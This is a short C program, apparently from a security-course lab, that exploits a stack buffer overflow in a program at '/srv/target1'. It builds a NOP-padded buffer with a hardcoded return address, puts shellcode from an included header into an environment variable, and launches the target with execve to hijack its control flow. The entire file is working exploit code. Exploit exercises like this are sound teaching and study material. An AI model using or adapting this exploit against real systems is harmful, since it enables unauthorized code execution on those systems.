#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

#define PADDING_SIZE 16
#define RETURN_ADDRESS 0xffffd719

int main(void) {
    char *args[3];
    char *env[2];

    char padding[PADDING_SIZE];
    memset(padding, '\x90', PADDING_SIZE);

    char *malicious_buffer = (char *)malloc(PADDING_SIZE + 4);
    memcpy(malicious_buffer, padding, PADDING_SIZE);
    *(unsigned int *)(malicious_buffer + PADDING_SIZE) = RETURN_ADDRESS;

    char shellcode_env[sizeof(shellcode) + 8];
    sprintf(shellcode_env, "SHELL=%s", shellcode);

    args[0] = TARGET;
    args[1] = malicious_buffer;
    args[2] = NULL;

    env[0] = shellcode_env;
    env[1] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");
    return 0;
}